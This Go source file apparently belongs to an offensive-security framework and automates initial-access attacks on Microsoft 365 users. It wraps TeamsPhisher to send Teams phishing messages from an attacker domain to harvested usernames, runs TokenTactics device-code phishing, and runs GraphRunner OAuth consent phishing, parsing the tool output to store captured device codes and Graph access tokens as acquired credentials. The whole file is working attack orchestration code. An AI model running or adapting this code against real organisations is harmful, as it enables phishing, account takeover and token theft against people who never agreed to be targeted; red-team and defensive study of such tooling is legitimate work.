package modules

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
)

func RunTeamsPhish(ctx context.Context, state *core.ADState, config tools.TeamsPhishConfig) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	if !tools.TeamsPhisher.Available() {
		slog.Warn("TeamsPhisher not available — install TeamsPhisher.py and dependencies")
		return result
	}

	if config.TargetsFile == "" {
		slog.Warn("no targets file provided, writing inline targets to temp file")
		tmpFile := filepath.Join(os.TempDir(), "adpack_teams_targets.txt")
		var targets []string
		for _, u := range state.Users {
			if u.Username != "" {
				targets = append(targets, u.Username)
			}
		}
		if len(targets) == 0 {
			slog.Warn("no users in state to generate targets from — skipping Teams phishing")
			return result
		}
		content := strings.Join(targets, "\n")
		if err := os.WriteFile(tmpFile, []byte(content), 0600); err != nil {
			slog.Error("failed to write temp targets file", "error", err)
			return result
		}
		config.TargetsFile = tmpFile
	}

	slog.Info("starting Teams phishing", "attacker_domain", config.AttackerDomain, "targets", config.TargetsFile)
	cr, err := tools.TeamsPhisher.RunPhish(ctx, config)
	if err != nil {
		slog.Error("Teams phishing failed", "error", err)
		result.Success = false
		result.RawOutput = cr.Stdout
		return result
	}

	result.RawOutput = cr.Stdout
	lines := strings.Split(cr.Stdout, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, "[+]") {
			slog.Info("Teams phish success indicator", "detail", trimmed)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type:       core.EvCredAcquired,
				Phase:      core.PhaseInitialAccess,
				Source:     "teams_phish",
				Key:        "teams_phish_result",
				Value:      trimmed,
				Confidence: 0.7,
				Timestamp:  time.Now(),
			})
		}
	}

	if state != nil {
		state.Phases[core.PhaseInitialAccess] = core.PhaseComplete
	}
	slog.Info("Teams phishing complete", "results", len(result.Evidence))
	return result
}

func RunDeviceCodeAuth(ctx context.Context, state *core.ADState, client string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	if !tools.TokenTactics.Available() {
		slog.Warn("TokenTactics not available — install with: Install-Module TokenTactics")
		return result
	}

	if client == "" {
		client = "Microsoft365"
	}

	slog.Info("starting device code auth", "client", client)
	stdout, err := tools.TokenTactics.RunDeviceCodeAuth(ctx, client)
	if err != nil {
		slog.Error("device code auth failed", "error", err)
		result.Success = false
		return result
	}

	result.RawOutput = stdout
	fmt.Println("=== Device Code Authentication ===")
	fmt.Println(stdout)
	fmt.Println("=================================")

	lines := strings.Split(stdout, "\n")
	var deviceCode, userCode string
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, "user_code") || strings.Contains(trimmed, "User code") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) > 1 {
				userCode = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(trimmed, "device_code") || strings.Contains(trimmed, "Device code") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) > 1 {
				deviceCode = strings.TrimSpace(parts[1])
			}
		}
	}

	if state != nil {
		state.Tokens = append(state.Tokens, core.Token{
			Type:     "device_code",
			Resource: client,
			Source:   "device_code_auth",
			Secret:   deviceCode,
		})
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type:       core.EvCredAcquired,
			Phase:      core.PhaseInitialAccess,
			Source:     "device_code_auth",
			Key:        "device_code",
			Value:      userCode,
			Confidence: 0.8,
			Timestamp:  time.Now(),
		})
		state.Phases[core.PhaseInitialAccess] = core.PhaseComplete
	}
	return result
}

func RunOAuthConsentPhish(ctx context.Context, state *core.ADState, tokens *tools.GraphTokens, appURL string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	if !tools.GraphRunner.Available() {
		slog.Warn("GraphRunner not available — skipping OAuth consent phishing")
		return result
	}

	if tokens == nil {
		slog.Warn("no Graph tokens provided — skipping OAuth consent phishing")
		return result
	}

	if appURL == "" {
		appURL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
	}

	slog.Info("starting OAuth consent phishing", "app_url", appURL)
	cr, err := tools.GraphRunner.RunConsentPhish(ctx, tokens, appURL)
	if err != nil {
		slog.Error("OAuth consent phishing failed", "error", err)
		result.Success = false
		result.RawOutput = cr.Stdout
		return result
	}

	result.RawOutput = cr.Stdout
	lines := strings.Split(cr.Stdout, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, "access_token") || strings.Contains(trimmed, "AccessToken") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) > 1 {
				tokenVal := strings.Trim(strings.TrimSpace(parts[1]), "\"', ")
				if state != nil && tokenVal != "" {
					tenantID := ""
					if tokens != nil {
						tenantID = tokens.TenantID
					}
					state.Tokens = append(state.Tokens, core.Token{
						Type:     "access",
						Resource: "MSGraph",
						Source:   "oauth_consent",
						Secret:   tokenVal,
						Tenant:   tenantID,
					})
				}
			}
		}
	}

	if state != nil {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type:       core.EvCredAcquired,
			Phase:      core.PhaseInitialAccess,
			Source:     "oauth_consent",
			Key:        "oauth_consent",
			Value:      "OAuth consent phish completed",
			Confidence: 0.7,
			Timestamp:  time.Now(),
		})
		state.Phases[core.PhaseInitialAccess] = core.PhaseComplete
	}
	return result
}
